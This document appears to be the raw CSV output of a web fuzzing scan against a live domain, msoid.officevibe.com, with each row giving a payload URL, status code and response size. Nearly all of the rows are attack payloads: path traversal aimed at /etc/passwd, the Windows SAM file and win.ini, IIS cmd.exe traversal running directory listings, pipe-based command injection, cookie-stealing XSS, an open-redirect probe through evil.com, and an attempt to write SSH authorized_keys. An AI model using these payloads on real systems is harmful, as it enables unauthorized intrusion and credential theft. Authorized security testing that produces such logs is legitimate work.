FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,29091,403,312,17,7,text/html; charset=us-ascii,32.209561ms,
<script>alert('XSS')</script>.aspx,https://msoid.officevibe.com/<script>alert('XSS')</script>.aspx,,31701,200,154968,2967,161,text/html; charset=utf-8,54.865304ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://msoid.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,11.175864ms,
jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html,https://msoid.officevibe.com/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html,,32524,200,154968,2967,161,text/html; charset=utf-8,43.983084ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,11.251524ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://msoid.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,11.030763ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://msoid.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,12.120318ms,
%3f.jsp,https://msoid.officevibe.com/%3f.jsp,https://login.windows.net/login.srf?.jsp,36078,302,157,6,4,text/html; charset=utf-8,37.664878ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,https://msoid.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,11.598093ms,
../.pass,https://msoid.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,11.651706ms,
../.passwd,https://msoid.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,11.751199ms,
<script>alert('Vulnerable')</script>.jsp,https://msoid.officevibe.com/<script>alert('Vulnerable')</script>.jsp,,37573,200,154968,2967,161,text/html; charset=utf-8,45.837615ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,https://msoid.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,11.070219ms,
../../../../../logs/access.log,https://msoid.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,11.867536ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://msoid.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,11.150671ms,
scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver,https://msoid.officevibe.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver,,39641,403,312,17,7,text/html; charset=us-ascii,32.8408ms,
cgi-bin/cutecast/members/<username>.user,https://msoid.officevibe.com/cgi-bin/cutecast/members/<username>.user,,40791,200,154968,2967,161,text/html; charset=utf-8,48.866995ms,
../../apache/logs/error.log,https://msoid.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,10.966236ms,
gmkt.inc/login,https://msoid.officevibe.com/gmkt.inc/login,,41896,200,155240,2980,165,text/html; charset=utf-8,86.148351ms,
test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd,https://msoid.officevibe.com/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd,,43794,403,312,17,7,text/html; charset=us-ascii,34.908148ms,
..%255c..%255c..%255c..%255c..%255c../windows/repair/sam,https://msoid.officevibe.com/..%255c..%255c..%255c..%255c..%255c../windows/repair/sam,,44685,403,312,17,7,text/html; charset=us-ascii,80.540723ms,
..%252f..%252f..%252f..%252f..%252f../windows/repair/sam,https://msoid.officevibe.com/..%252f..%252f..%252f..%252f..%252f../windows/repair/sam,,44733,403,312,17,7,text/html; charset=us-ascii,93.367251ms,
gmkt.inc/Login,https://msoid.officevibe.com/gmkt.inc/Login,,45108,200,155240,2980,165,text/html; charset=utf-8,47.113168ms,
login.srf,https://msoid.officevibe.com/login.srf,https://www.office.com/login#,45420,302,146,6,4,text/html; charset=utf-8,40.661896ms,
../../../logs/access.log,https://msoid.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,11.146031ms,
betsie/parserl.pl/<script>alert('XSS')</script>;,https://msoid.officevibe.com/betsie/parserl.pl/<script>alert('XSS')</script>;,,48930,200,155099,2967,161,text/html; charset=utf-8,87.542944ms,
../../logs/access.log,https://msoid.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,11.118716ms,
../../../../../logs/error.log,https://msoid.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,11.620524ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://msoid.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,11.019514ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,https://msoid.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,11.2142ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,https://msoid.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,11.497264ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://msoid.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,11.191596ms,
static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini,https://msoid.officevibe.com/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini,,53461,403,312,17,7,text/html; charset=us-ascii,34.679335ms,
static/..%5c..%5cetc/passwd,https://msoid.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,11.22479ms,
jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc,https://msoid.officevibe.com/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc,,54462,403,312,17,7,text/html; charset=us-ascii,18.942169ms,
..//etc/passwd;index.html,https://msoid.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,11.551938ms,
jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,https://msoid.officevibe.com/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,,55833,403,312,17,7,text/html; charset=us-ascii,80.587887ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://msoid.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,17.122856ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,11.619919ms,
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://msoid.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,11.202532ms,
.,https://msoid.officevibe.com/.,https://www.office.com/login#,59964,302,146,6,4,text/html; charset=utf-8,21.373886ms,
//../../data/config/microsrv.cfg,https://msoid.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,11.070502ms,
[SecCheck]/..%255c..%255c../ext.ini,https://msoid.officevibe.com/[SecCheck]/..%255c..%255c../ext.ini,,64000,403,312,17,7,text/html; charset=us-ascii,39.889307ms,
../../apache/logs/access.log,https://msoid.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,12.131547ms,
"index.php/\""><script><script>alert(document.cookie)</script><","https://msoid.officevibe.com/index.php/\""><script><script>alert(document.cookie)</script><",,65142,200,154968,2967,161,text/html; charset=utf-8,60.321845ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,https://msoid.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,11.179024ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://msoid.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,10.960228ms,
static/..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,11.250272ms,
../webserver.ini,https://msoid.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,11.656772ms,
xyz/../../ThinVnc.ini,https://msoid.officevibe.com/xyz/../../ThinVnc.ini,,74299,403,312,17,7,text/html; charset=us-ascii,11.310474ms,
static/../../../a/../../../../etc/passwd,https://msoid.officevibe.com/static/../../../a/../../../../etc/passwd,,74451,403,312,17,7,text/html; charset=us-ascii,11.365112ms,
[SecCheck]/..%252f..%252f../ext.ini,https://msoid.officevibe.com/[SecCheck]/..%252f..%252f../ext.ini,,74714,403,312,17,7,text/html; charset=us-ascii,37.647846ms,
..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam,https://msoid.officevibe.com/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam,,75750,403,312,17,7,text/html; charset=us-ascii,77.709546ms,
.well-known/assetlinks.json,https://msoid.officevibe.com/.well-known/assetlinks.json,,76541,200,830,4,4,application/json; charset=utf-8,73.376642ms,
static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,77730,403,312,17,7,text/html; charset=us-ascii,11.158631ms,
..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/..%5c..%5c..%5c..%5cetc/passwd,,78884,403,312,17,7,text/html; charset=us-ascii,12.681798ms,
cfide/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/cfide/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,80731,403,312,17,7,text/html; charset=us-ascii,32.553745ms,
../../logs/error.log,https://msoid.officevibe.com/../../logs/error.log,,84935,403,312,17,7,text/html; charset=us-ascii,11.974617ms,
?mod=<script>alert(document.cookie)</script>&op=browse,https://msoid.officevibe.com/?mod=<script>alert(document.cookie)</script>&op=browse,,87084,200,188801,4938,168,text/html; charset=utf-8,60.66682ms,
static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,88703,403,312,17,7,text/html; charset=us-ascii,11.587032ms,
static/../../../../windows/win.ini.,https://msoid.officevibe.com/static/../../../../windows/win.ini.,,88730,403,312,17,7,text/html; charset=us-ascii,11.443108ms,
..//..///etc/passwd,https://msoid.officevibe.com/..//..///etc/passwd,,89982,403,312,17,7,text/html; charset=us-ascii,11.704706ms,
..\..\..\..\..\..\temp\temp.class,https://msoid.officevibe.com/..\..\..\..\..\..\temp\temp.class,,91616,403,312,17,7,text/html; charset=us-ascii,11.746801ms,
../manager/text,https://msoid.officevibe.com/../manager/text,,91797,403,312,17,7,text/html; charset=us-ascii,11.593777ms,
..%5c..%5cetc/passwd,https://msoid.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,11.1588ms,
../../../../apache/logs/error.log,https://msoid.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,11.653844ms,
..////etc/passwd,https://msoid.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,11.156642ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,https://msoid.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,11.643044ms,
.//..///etc/passwd,https://msoid.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,11.086187ms,
"\""><img%20src=\""javascript:alert(document.domain)\"">","https://msoid.officevibe.com/\""><img%20src=\""javascript:alert(document.domain)\"">",,96807,200,154968,2967,161,text/html; charset=utf-8,45.832238ms,
re.js></script>,https://msoid.officevibe.com/re.js></script>,,97443,200,154967,2967,161,text/html; charset=utf-8,27.043743ms,
../../../.htaccess,https://msoid.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,11.385225ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,https://msoid.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,,99167,403,312,17,7,text/html; charset=us-ascii,11.170796ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,https://msoid.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,,99682,403,312,17,7,text/html; charset=us-ascii,11.390695ms,
../html,https://msoid.officevibe.com/../html,,100072,403,312,17,7,text/html; charset=us-ascii,11.150451ms,
sitemapindex.xml</pre></body></html>,https://msoid.officevibe.com/sitemapindex.xml</pre></body></html>,,100241,200,155099,2967,161,text/html; charset=utf-8,43.705695ms,
../config.php,https://msoid.officevibe.com/../config.php,,102518,403,312,17,7,text/html; charset=us-ascii,12.113691ms,
script>alert('Vulnerable')</script>.cfm,https://msoid.officevibe.com/script>alert('Vulnerable')</script>.cfm,,101884,200,155099,2967,161,text/html; charset=utf-8,1.191778267s,
pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,103869,403,312,17,7,text/html; charset=us-ascii,18.583284ms,
jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,https://msoid.officevibe.com/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,,104832,403,312,17,7,text/html; charset=us-ascii,17.320336ms,
//evil.com/%2F..,https://msoid.officevibe.com///evil.com/%2F..,https://login.windows.net/login.srf,106852,302,152,6,4,text/html; charset=utf-8,37.88736ms,
res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://msoid.officevibe.com/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,107746,403,312,17,7,text/html; charset=us-ascii,11.460331ms,
../users.db.php,https://msoid.officevibe.com/../users.db.php,,108705,403,312,17,7,text/html; charset=us-ascii,11.562307ms,
../apache/logs/error.log,https://msoid.officevibe.com/../apache/logs/error.log,,108758,403,312,17,7,text/html; charset=us-ascii,11.184885ms,
my_keys&dst=../../../root/.ssh/authorized_keys,https://msoid.officevibe.com/my_keys&dst=../../../root/.ssh/authorized_keys,,109041,403,312,17,7,text/html; charset=us-ascii,11.840835ms,
files/login.php3err=hack&BSX_HTXDIR=<br>,https://msoid.officevibe.com/files/login.php3err=hack&BSX_HTXDIR=<br>,,110018,200,155099,2967,161,text/html; charset=utf-8,47.768645ms,
signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,https://msoid.officevibe.com/signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,,111191,403,312,17,7,text/html; charset=us-ascii,11.139392ms,
script.js%3E%3C/script%3E&ext=somev,https://msoid.officevibe.com/script.js%3E%3C/script%3E&ext=somev,,112140,200,154967,2967,161,text/html; charset=utf-8,38.253706ms,
ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,https://msoid.officevibe.com/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,,112444,403,312,17,7,text/html; charset=us-ascii,11.174005ms,
votes/../../admin/multiuser/multiuser.php,https://msoid.officevibe.com/votes/../../admin/multiuser/multiuser.php,,112576,403,312,17,7,text/html; charset=us-ascii,11.493808ms,
cc/index.php</a></p>,https://msoid.officevibe.com/cc/index.php</a></p>,,113030,200,154967,2967,161,text/html; charset=utf-8,47.118721ms,
#/../admin,https://msoid.officevibe.com/#/../admin,https://www.office.com/login#,113455,302,146,6,4,text/html; charset=utf-8,35.307989ms,
api/jolokia/read<svg%20onload=alert(document.cookie)>?mimeType=text/html,https://msoid.officevibe.com/api/jolokia/read<svg%20onload=alert(document.cookie)>?mimeType=text/html,,113922,200,154968,2967,161,text/html; charset=utf-8,59.724169ms,
spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini,https://msoid.officevibe.com/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini,,113977,403,312,17,7,text/html; charset=us-ascii,21.724956ms,
ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,https://msoid.officevibe.com/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,,114224,403,312,17,7,text/html; charset=us-ascii,11.825533ms,
"<a href=""http:www.clix4btc.com","https://msoid.officevibe.com/<a href=""http:www.clix4btc.com",,114528,200,154967,2967,161,text/html; charset=utf-8,26.929608ms,
cgi/vqrespond.pl<SCRIPT>alert(,https://msoid.officevibe.com/cgi/vqrespond.pl<SCRIPT>alert(,,119058,200,154968,2967,161,text/html; charset=utf-8,42.72722ms,
~/<script>alert('Vulnerable')</script>.asp,https://msoid.officevibe.com/~/<script>alert('Vulnerable')</script>.asp,,122884,200,154968,2967,161,text/html; charset=utf-8,90.038072ms,
../../proc,https://msoid.officevibe.com/../../proc,,125026,403,312,17,7,text/html; charset=us-ascii,11.152113ms,
[SecCheck]/..%2f../ext.ini,https://msoid.officevibe.com/[SecCheck]/..%2f../ext.ini,,127572,403,312,17,7,text/html; charset=us-ascii,11.254832ms,
admin/../../../file/to/view,https://msoid.officevibe.com/admin/../../../file/to/view,,128723,403,312,17,7,text/html; charset=us-ascii,11.078613ms,
~/<script>alert('XSS')</script>.asp,https://msoid.officevibe.com/~/<script>alert('XSS')</script>.asp,,129451,200,154968,2967,161,text/html; charset=utf-8,90.963914ms,
../../../../etc/passwd,https://msoid.officevibe.com/../../../../etc/passwd,,130010,403,312,17,7,text/html; charset=us-ascii,11.092019ms,
"tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://msoid.officevibe.com/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,134096,403,312,17,7,text/html; charset=us-ascii,11.018001ms,
../../../../../etc/passwd,https://msoid.officevibe.com/../../../../../etc/passwd,,134649,403,312,17,7,text/html; charset=us-ascii,11.332571ms,
..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,134653,403,312,17,7,text/html; charset=us-ascii,39.256323ms,
../../var/www/logs/access_log,https://msoid.officevibe.com/../../var/www/logs/access_log,,136450,403,312,17,7,text/html; charset=us-ascii,11.223738ms,
NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://msoid.officevibe.com/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,137428,403,312,17,7,text/html; charset=us-ascii,11.286367ms,
api/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html,https://msoid.officevibe.com/api/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html,,139034,200,155099,2967,161,text/html; charset=utf-8,48.609423ms,
../../../../pswd,https://msoid.officevibe.com/../../../../pswd,,139151,403,312,17,7,text/html; charset=us-ascii,11.28722ms,
wp-register.php</pre></body></html>,https://msoid.officevibe.com/wp-register.php</pre></body></html>,,143879,200,155099,2967,161,text/html; charset=utf-8,43.966334ms,
"cgi-bin/webprocgetpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:subpage=-<script>alert(""XSS"")</script>)","https://msoid.officevibe.com/cgi-bin/webprocgetpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:subpage=-<script>alert(""XSS"")</script>)",,144803,200,154967,2967,161,text/html; charset=utf-8,30.309501ms,
.well-known/apple-app-site-association,https://msoid.officevibe.com/.well-known/apple-app-site-association,,144908,200,262,2,2,application/json; charset=utf-8,41.460472ms,
../../..//etc/passwd,https://msoid.officevibe.com/../../..//etc/passwd,,145383,403,312,17,7,text/html; charset=us-ascii,11.097153ms,
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html,https://msoid.officevibe.com/%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html,,147616,200,154967,2967,161,text/html; charset=utf-8,26.629053ms,
cgi-bin/betsie/parserl.pl/<script>alert('Vulnerable')</script>;,https://msoid.officevibe.com/cgi-bin/betsie/parserl.pl/<script>alert('Vulnerable')</script>;,,148053,200,154968,2967,161,text/html; charset=utf-8,90.574119ms,
../../../../../../../../../../etc/passwd,https://msoid.officevibe.com/../../../../../../../../../../etc/passwd,,149904,403,312,17,7,text/html; charset=us-ascii,11.1788ms,
\..\..\..\..\..\..\..\..\..\etc\passwd,https://msoid.officevibe.com/\..\..\..\..\..\..\..\..\..\etc\passwd,,149962,403,312,17,7,text/html; charset=us-ascii,11.179341ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,https://msoid.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,,150077,403,312,17,7,text/html; charset=us-ascii,11.445618ms,
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,https://msoid.officevibe.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,150783,403,312,17,7,text/html; charset=us-ascii,10.940182ms,
../logs/error.log,https://msoid.officevibe.com/../logs/error.log,,150787,403,312,17,7,text/html; charset=us-ascii,11.215004ms,
../_config.php,https://msoid.officevibe.com/../_config.php,,152532,403,312,17,7,text/html; charset=us-ascii,13.506663ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,https://msoid.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,,152732,403,312,17,7,text/html; charset=us-ascii,11.289386ms,
../../../../winnt/repair/sam._,https://msoid.officevibe.com/../../../../winnt/repair/sam._,,152901,403,312,17,7,text/html; charset=us-ascii,11.246788ms,
phpDocumentor/common.inc.php/index.html:<br>,https://msoid.officevibe.com/phpDocumentor/common.inc.php/index.html:<br>,,154351,200,154968,2967,161,text/html; charset=utf-8,43.221031ms,
